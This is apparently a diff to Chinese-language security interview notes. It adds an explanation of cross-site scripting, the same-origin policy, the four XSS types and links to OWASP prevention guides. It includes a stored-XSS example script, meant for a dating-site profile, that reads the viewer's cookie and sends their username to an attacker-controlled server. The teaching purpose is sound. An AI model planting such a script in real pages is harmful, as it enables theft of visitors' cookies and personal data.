@@ -40,7 +40,36 @@
 ## 6 能够通过代码静态检查分析来检测SQL注入，能够给出大致的思路；
 *todo*
 ## 7 什么是 Cross-Site Scripting?
-*todo*
+Cross-Site Scripting 也叫做 XSS ，它允许攻击者将客户端代码侵入到用户的的浏览的页面中。为什么它可以做到这一点呢？因为它绕过了同源策略（Same Origin Policy)。
+
+所谓同源策略也就是说浏览器针对同一个站点的内容都授予权限来访问资源，比如说 cookie 什么的。如果网站内容下面三者相同，就表明是同源的
+1. URI schema 相同
+2. host 名相同
+3. port 相同
+
+攻击者将有问题的脚本（一般为代码）通过安全的网站分发给浏览这个网站的用户，由于脚本现在属于同源的内容，因此有权限访问一些敏感的数据，并且将它们发送给攻击者，这样完成了数据窃取。
+假设现在有一个相亲网站，你是其中的一名会员，不过你想知道有哪些人访问了你的主页。你可以在自我介绍的的输入框的最后，添加上这么一段代码
+```js
+<script> 
+let cookie = document.cookie;
+let userName = getUsername("https://www.binddate.com", cookie);
+sendUserNameToMyServer("https://www.myserver.com", userName);
+</script>
+```
+
+这样在别的会员在用浏览器加载你的主页的时候，你的自我介绍就会被从数据库中加载到用户的浏览器中。但是最后的 `script` 标签会被浏览器执行，由于是同源上的内容，所以正在浏览的用户的 cookie 就会被访问，进而读取到用户的姓名，完成了数据的窃取。
+
+XSS 主要分为四种
+1. Reflected. 这是大部分 XSS 的类型，它是由客户端提供的内容导致的。一般的搜索或者提交的 Web 应用都会返回用户的输入。如果用户的提交的的内容是攻击的代码，那么就可能导致问题的出现。
+2. Stored: 这种类型是用户的攻击的代码存储在数据库中，而且能够将这个脚本发送给所有正常的页面。比如上面的例子就是这种类型。
+3. Server-side versus DOM-based vulnerabilities: 这是将渲染和业务逻辑放置在客户端引出的 XSS 攻击
+4. Mutated: 这是一种看上去安全的内容，但是但是它能够通过浏览器重写，修改和解析标记文本，比如少些一个闭合的方括号。
+
+既然出现了 XSS 的攻击，就有办法阻止这种攻击
+
+- [XSS 检查清单](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
+- [DOM 类型检查清单](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
+- [代码 Review 注意事项](https://owasp.org/www-project-code-review-guide/migrated_content)
 ## 8 什么是Cross-Site Forgery Attack?
 *todo*
 ## 9 HTTPS是如何工作的？
